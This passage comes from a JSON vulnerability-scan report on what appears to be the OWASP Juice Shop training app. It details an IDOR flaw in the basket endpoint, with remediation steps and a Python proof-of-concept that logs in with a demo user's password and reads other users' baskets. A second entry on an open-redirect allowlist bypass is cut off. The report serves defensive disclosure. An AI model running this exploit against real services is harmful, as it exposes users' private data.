          "properties": {
            "security-severity": "6.5",
            "strix": {
              "id": "vuln-0005",
              "severity": "medium",
              "cvss": 6.5,
              "timestamp": "2026-05-09 10:57:31 UTC",
              "target": "http://host.docker.internal:3002",
              "endpoint": "/rest/basket/:id",
              "method": "GET",
              "cwe": "CWE-639",
              "impact": "An authenticated attacker can enumerate and access all shopping baskets in the system by iterating over sequential basket IDs. This exposes:\n\n- Product selections and quantities for all users, revealing purchasing intent and preferences\n- Pricing information including any applied discounts or coupons\n- User IDs linked to baskets, enabling correlation of shopping behavior to specific accounts\n- Potential for further abuse including basket manipulation if PUT/POST endpoints share the same access control gap\n\nIn an e-commerce context, this represents a significant privacy violation and potential competitive intelligence exposure.",
              "technical_analysis": "The vulnerable code in `routes/basket.ts` implements the `retrieveBasket()` function. The handler extracts the basket ID directly from `req.params.id` and queries the database without any ownership check:\n\n```typescript\nconst id = req.params.id\nconst basket = await BasketModel.findOne({ where: { id }, include: [{ model: ProductModel, paranoid: false, as: 'Products' }] })\n```\n\nWhile the route is protected by JWT authentication middleware (requiring a valid `Authorization: Bearer <token>` header), the handler never compares the authenticated user's identity against the basket's `UserId` field. The challenge-solving code on lines 21-24 merely logs the access for gamification purposes but does not restrict it.\n\nThe result is that any authenticated user can access any basket in the system by supplying its numeric ID in the URL path.",
              "remediation_steps": "1. Implement ownership validation in the basket retrieval handler. After fetching the basket from the database, compare its `UserId` field against the authenticated user's ID extracted from the JWT token. Return HTTP 403 if they do not match.\n\n2. Apply the same ownership check to all basket-related endpoints (PUT, POST for basket items) to ensure consistent access control.\n\n3. Consider using the authenticated user's ID to look up their basket rather than accepting a user-supplied basket ID:\n   ```typescript\n   const user = security.authenticatedUsers.from(req)\n   const basket = await BasketModel.findOne({ where: { UserId: user.data.id } })\n   ```\n\n4. Implement rate limiting on basket access endpoints to mitigate enumeration attacks.\n\n5. Add integration tests that verify cross-user basket access is blocked.",
              "poc": {
                "description": "To reproduce:\n\n1. Authenticate as a non-admin user (jim@juice-sh.op) to obtain a valid JWT token.\n2. Retrieve the authenticated user's own basket (basket ID 2) to confirm normal access.\n3. Change the basket ID in the URL to 1 (the admin user's basket) and observe that the full basket contents are returned without restriction.\n4. Repeat with basket ID 3 to confirm access to yet another user's basket.",
                "script": "import requests\nimport json\n\nBASE_URL = \"http://host.docker.internal:3002\"\n\n# Step 1: Authenticate as jim (non-admin user)\nlogin_resp = requests.post(\n    f\"{BASE_URL}/rest/user/login\",\n    json={\"email\": \"jim@juice-sh.op\", \"password\": \"ncc-1701\"},\n    timeout=10\n)\njim_token = login_resp.json()[\"authentication\"][\"token\"]\njim_bid = login_resp.json()[\"authentication\"][\"bid\"]\nheaders = {\"Authorization\": f\"Bearer {jim_token}\"}\n\nprint(f\"[+] Authenticated as jim@juice-sh.op (basket id: {jim_bid})\")\n\n# Step 2: Access own basket (expected behavior)\nown_basket = requests.get(f\"{BASE_URL}/rest/basket/{jim_bid}\", headers=headers, timeout=10)\nprint(f\"[+] Own basket (id={jim_bid}): HTTP {own_basket.status_code}\")\n\n# Step 3: Access admin's basket (IDOR - should be blocked but isn't)\nadmin_basket = requests.get(f\"{BASE_URL}/rest/basket/1\", headers=headers, timeout=10)\nprint(f\"[!] Admin basket (id=1): HTTP {admin_basket.status_code}\")\nif admin_basket.status_code == 200:\n    data = admin_basket.json()\n    print(f\"[!] IDOR CONFIRMED - Retrieved admin basket belonging to UserId: {data['data']['UserId']}\")\n    products = data['data'].get('Products', [])\n    print(f\"[!] Admin basket contains {len(products)} product(s):\")\n    for p in products:\n        print(f\"    - {p['name']} (qty: {p['BasketItem']['quantity']}, price: {p['price']})\")\n\n# Step 4: Access another user's basket\nother_basket = requests.get(f\"{BASE_URL}/rest/basket/3\", headers=headers, timeout=10)\nprint(f\"[!] Other user basket (id=3): HTTP {other_basket.status_code}\")\nif other_basket.status_code == 200:\n    data = other_basket.json()\n    print(f\"[!] Retrieved basket belonging to UserId: {data['data']['UserId']}\")\n\n# Step 5: Confirm auth IS required (not completely open)\nnoauth_resp = requests.get(f\"{BASE_URL}/rest/basket/1\", timeout=10)\nprint(f\"\\n[i] Without auth token: HTTP {noauth_resp.status_code} (auth required but no ownership check)\")"
              }
            }
          }
        },
        {
          "ruleId": "CWE-601",
          "level": "warning",
          "message": {
            "text": "Open Redirect via Allowlist Bypass in URL Redirect Endpoint"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "lib/insecurity.ts"
                },
                "region": {
                  "startLine": 135,
                  "endLine": 141,
                  "snippet": {
                    "text": "export const isRedirectAllowed = (url: string) => {\n  let allowed = false\n  for (const allowedUrl of redirectAllowlist) {\n    allowed = allowed || url.includes(allowedUrl) // vuln-code-snippet vuln-line redirectChallenge\n  }\n  return allowed\n}"
                  }
